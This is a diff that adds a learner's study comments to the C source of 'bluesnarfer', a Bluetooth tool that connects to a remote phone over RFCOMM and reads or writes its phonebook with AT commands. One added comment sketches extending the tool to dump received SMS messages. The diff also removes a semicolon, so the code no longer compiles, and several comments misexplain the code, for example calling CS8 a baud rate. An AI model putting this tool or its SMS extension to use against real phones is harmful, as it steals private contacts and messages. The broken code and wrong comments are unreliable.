@@ -271,7 +271,7 @@ int bt_get_remote_name(char *str_bdaddr) {
 
         str2ba(str_bdaddr, &bdaddr);// takes the string bluetooth address and changes it to a 
 		// bluetooth address that bluetooth can use and is stored at the address of "bdaddr"
-
+			
         memcpy(&cr.bdaddr, &bdaddr, sizeof(bdaddr_t));
         cr.type = ACL_LINK;
 		// memcpy is used to copy the memory blocks from one location to another
@@ -298,24 +298,36 @@ int bt_get_remote_name(char *str_bdaddr) {
 		//in this case it would return a values LESS THAN ZERO 
 		}
 
+				//hci_create_connection is not defined by this prorgam but rather found in hci.h 
+				//used to init a connection between 2 devices
+				//FIRST PARAM dd is called and inited in like 264 which is the file descriptor 
+				// SECOND PARAM is the address of the bluetooth device
                 if ((cc = hci_create_connection(dd, &bdaddr,
                                                 htobs(HCI_DM1 | HCI_DH1), 0, 0,
                                                 (void *)&handler, 25000)) < 0) {
 				// this function takes in dd which holds the device connection, takes the bluetooth address from str2ba,
 				// htobs function is used to convert numbers to bluetooth byte order 
 				//
+				//the rest of the params are described in the blue_notes markdown in the hci_create_connection section
+				//
+				//
+				//if no connection was established then it will be less than zero and return an error 
+				//and close the device 
                         fprintf(stderr,
                                 "bluesnarfer: hci_create_connection failed\n");
                         hci_close_dev(dd);
 
                         return -1;
-                }
+				}
         }
-
+// This sends a request to the device to retrieve the "user friendly device name"
         if (hci_read_remote_name(dd, &bdaddr, 248, name, 25000)) {
+			// this uses the file discrip used earlier, with the bluetooth address, 248 is the max 
+			// chars for the device name, and "name" is a variable to hold the device name 
+			// 25000 is the amount of time the functuion will run until it returns an error 
 
                 fprintf(stderr, "bluesnarfer: hci_read_remote_name failed\n");
-
+// this prints out the error 
                 hci_close_dev(dd);
                 hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION,
                                10000);
@@ -323,39 +335,55 @@ int bt_get_remote_name(char *str_bdaddr) {
                 return -1;
         }
 
-        printf("device name: %s\n", name);
+        printf("device name: %s\n", name);// this prints out the device name
 
-        if (cc)
+        if (cc) // i need to touch up on if statment 
                 hci_disconnect(dd, handler, HCI_OE_USER_ENDED_CONNECTION,
                                10000);
 
-        hci_close_dev(dd);
-        return 0;
+        hci_close_dev(dd); // closes the device name
+        return 0; // exits the program 
 }
 
 char *rfcomm_read(FILE *fp, char *send) {
-
+// this function takes in a file pointer and an array called "send"
         int r, ret;
         char *line;
+		// these lines init a array and variables for R and RET that will be used for later 
+		// the main purpose of this file is to read from the fp file stream to get informaion
+        long unsigned int line_size // this is used to store large values of positive numbers 
 
-        long unsigned int line_size;
-
-        line = 0x00;
+        line = 0x00; // this is the buffer for this memory that is being set
         ret = line_size = 0;
 
-        while (1) {
+        while (1) { // while true 
 
                 r = getline(&line, &line_size, fp);
+				// r holds the amount of characteres read from getline
 
-                line[r - 1] = 0;
+                line[r - 1] = 0; // this replaces the newline character at the end of the line with a null 
 
                 if (!strncmp(line, send, strlen(line)) && !ret) {
+				// this checks if line and send are the same 
+				// if they match then they return a zero 
+				// !ret checks if ret is zero in this case it would negate the val of ret 
+				// so if ret is 1 then it would check if ret would be zero 
+				// if ret is not zero then the function found a line that doesnt match 
+				//
+				//
+				// if both conditions are true we set ret to 1 
+				// in this case if the lines and send DONT match and ret 
+				// this means we found a matching line and then looks for another mis matching line 
+				// 
 
                         ret = 1;
                         continue;
                 }
 
                 if (strncmp(line, send, strlen(line)) && ret)
+					// this compares line, with send and ret 
+					// so if line and ret are the same and ret
+					// so if this is anything but zero it will return the line
                         return line;
         }
 
@@ -364,27 +392,37 @@ char *rfcomm_read(FILE *fp, char *send) {
 
 FILE *bt_rfcomm(int sock, char *str_bdaddr, int channel) {
 
-        struct rfcomm_dev_req req;
-        int device, ctl;
+	struct rfcomm_dev_req req; // this struct is found in the blutooth.h file 
+		// this is used for defining device id, channel , and the device name 
+		// the struct make up will be added to the markdown file 
+        int device, ctl; // THIS IS WHERE DEVICE IS INITED 
         bdaddr_t bdaddr;
         FILE *fd;
 
         //fprintf(stderr, "calling hci_get_route(0x00)\n");
         if ((device = hci_get_route(0x00)) < 0) {
 
-                fprintf(stderr, "bluesnarfer: hci_get_route local failed\n");
+                fprintf(stderr, "bluesnarfer: hci_get_route local failed\n");	
                 return 0x00;
+		// this looks and gets the route of the device id, each bt device has a unqiue device identifer 
+		// if it cant find it then it prints out the error message
         }
 
         str2ba(str_bdaddr, &bdaddr);
+		// converts the string bluetooth the an actuall bluetooth address at the address of bdadder
 
         memset(&req, 0x00, sizeof(req));
+		// this sets a block of memory bit of the bt structure to zero!!
 
-        req.dev_id = device;
-        req.channel = channel;
+        req.dev_id = device; // this gives the device id portion of the program the id found in hci_get_route
+        req.channel = channel; // sets the channel of the device in "req's" channel number (PASSED FROM FUNCTION!)
 
-        memcpy(&req.src, BDADDR_ANY, sizeof(BDADDR_ANY));
+        memcpy(&req.src, BDADDR_ANY, sizeof(BDADDR_ANY)); // this makes teh source of the struct to be 0 or a wildcard
+		// this allows it to listen for any device not a specific one 
+		// also this sets the souce of that device in req 
         memcpy(&req.dst, &bdaddr, sizeof(bdaddr));
+		// this sets the destination of the req struct to the bluetooth address passed to the functuion
+		// this is the other device btw
 
         //fprintf(stderr, "calling ioctl(sock, RFCOMMCREATEDEV, &req)\n");
         if (ioctl(sock, RFCOMMCREATEDEV, &req) < 0) {
@@ -394,6 +432,7 @@ FILE *bt_rfcomm(int sock, char *str_bdaddr, int channel) {
                         strerror(errno));
                 return 0x00;
         }
+		// error handling 
 
         //fprintf(stderr, "calling bt_rfcomm_config()\n");
         if (!(fd = bt_rfcomm_config())) {
@@ -402,26 +441,35 @@ FILE *bt_rfcomm(int sock, char *str_bdaddr, int channel) {
                 return 0x00;
         }
 
-        return fd;
+        return fd;	
+		// retunrs the file!
 }
 
 FILE *bt_rfcomm_config() {
 
-        char dev_device[1024];
-        struct termios term;
-        FILE *fd;
+        char dev_device[1024];// array for device name
+        struct termios term;// struct found in termios.h 
+		// i need WAY much more time with termios to understandd this 
+        FILE *fd;// makes a file called fd
         int fdc;
 
         snprintf(dev_device, 1024, "%s%d", RFCOMMDEV, device);
-
+		// this formats a string which will be stored in dev_device 
+		// 1024 is the max buffer size for this dev name 
+		// "%s%d" means that it will instert the string followed by ints 
+		// RFCOMMDEV is found in the bsnarf header file which holds teh dir path to a device 
         //fprintf(stderr, "opening %s\n", dev_device);
+		// device var might be a global idk
         if (!(fd = fopen(dev_device, "r+"))) {
                 fprintf(stderr, "bluesnarfer: open %s, %s\n", dev_device,
                         strerror(errno));
                 return 0x00;
-        }
+        } // error handling
 
         fdc = fileno(fd);
+		// gets the int descriptor witht the stream 
+		// converts the file stream to an int and stores it to fdc 
+		// this is helpful when working with low level io 
 
         //fprintf(stderr, "calling tcgetattr(fdc, &term)\n");
         if (tcgetattr(fdc, &term) < 0) {
@@ -429,14 +477,22 @@ FILE *bt_rfcomm_config() {
                 fprintf(stderr, "bluesnarfer: tcgetattr failed, %s\n",
                         strerror(errno));
                 return 0x00;
-        }
+        } // error handling 
 
         term.c_cflag = CS8 | CLOCAL | CREAD;
+		// baud rtate of 8 bits per byte, 
+		// enables a receiver, 
+		// ignored modem control line 
         term.c_iflag = ICRNL;
+		// converts return into new line 
         term.c_oflag = 0;
+		// output data is passed directly into driver 
         term.c_lflag = ICANON;
-
+		// canonical mode , input is sent only when user presses enet
         tcsetattr(fdc, TCSANOW, &term);
+		// fdc is the int val of the file discrptor 
+		// tcsanow means the changes should be immdiate 
+		// &term is where all these settings will be stored 
 
         if ((cfsetispeed(&term, B230400) < 0) ||
             (cfsetospeed(&term, B230400) < 0)) {
@@ -444,7 +500,7 @@ FILE *bt_rfcomm_config() {
                 fprintf(stderr, "bluesnarfer: cfset(i/o)speed failed, %s\n",
                         strerror(errno));
                 return 0x00;
-        }
+        } // error handling 
 
         return fd;
 }
@@ -490,7 +546,8 @@ int switch_cmd(FILE *fd, struct opt options) {
         return ret;
 }
 
-// raw output ..
+// raw output .. 
+// THIS IS SCKIPPED FOR NOW
 int custom_cmd(FILE *fd, char *cmd) {
 
         char buffer[128], *ptr;
@@ -526,16 +583,17 @@ int custom_cmd(FILE *fd, char *cmd) {
 
 void bt_rfcomm_rel() {
 
-        struct rfcomm_dev_req req;
+        struct rfcomm_dev_req req;// this make a struct for req 
 
         memset(&req, 0x00, sizeof(req));
-        req.dev_id = device;
+		// sets the starting size of req to 0 to start the memory 
+        req.dev_id = device; // sets the device id from hic_get_route function
 
         if (ioctl(ctl, RFCOMMRELEASEDEV, &req) < 0) {
 
                 fprintf(stderr, "bluesnarfer: unable to relase rfcomm\n");
                 exit(-1);
-        }
+        }// error handling
 
         printf("bluesnarfer: release rfcomm ok\n");
 
@@ -543,19 +601,26 @@ void bt_rfcomm_rel() {
 }
 
 int rw_cmd(FILE *fd, struct opt options) {
-
-        char buffer[32];
-        char *ptr, *tptr;
+		// IMPORTANT FUNCTIONS! 
+		// - rfcomm_read 
+        char buffer[32];// sets buffer size
+        char *ptr, *tptr; // makes strings 
 
         if (!options.phonebook) {
+			// if opetions phone book not found
 
                 fwrite(DEFAULTPB, strlen(DEFAULTPB), 1, fd);
+				// defaultpb is found in bsnar.h with val of "AT+CPBS=\"ME\"\r\n"
+				// all of this is going to be written to fd 
+				// so with the file provided in the function it will then write DEFAULTPB to it
 
                 rfcomm_read(fd, DEFAULTPB);
+				// this then passed into the rfcomm_read func
         } else {
 
                 printf("custom phonebook selected\n");
                 snprintf(buffer, 32, "AT+CPBS=\"%s\"\r\n", options.phonebook);
+				// this gets all the range of phone book entries 
                 fwrite(buffer, strlen(buffer), 1, fd);
 
                 rfcomm_read(fd, buffer);
@@ -565,6 +630,17 @@ int rw_cmd(FILE *fd, struct opt options) {
 
                 if (options.act == READ)
                         snprintf(buffer, 32, "AT+CPBR=%d\r\n", options.N_MIN);
+				// AT+CPBR=1 this reads the first row but with %d it reads the amount of rows provided by N_MIN 
+				// this would be were one would try to add SMS reading 
+				// TO READ ALL SMS you set the status to REC READ
+				// so we have to set the modem to text mode which was done earlier in 
+				// like this if (!fwrite(buffer, strlen(buffer), 1, fd)) {
+				// done on line 624 
+				// then we use this command to lis all RECIEVED and UNREAD messages 
+				//
+				// AT+CMGL="REC UNREAD"
+				//
+				// which then lists all the mesages to the user similar to how its done in sim phonebook 
 
                 else
                         snprintf(buffer, 32, "AT+CPBW=%d\r\n", options.N_MIN);
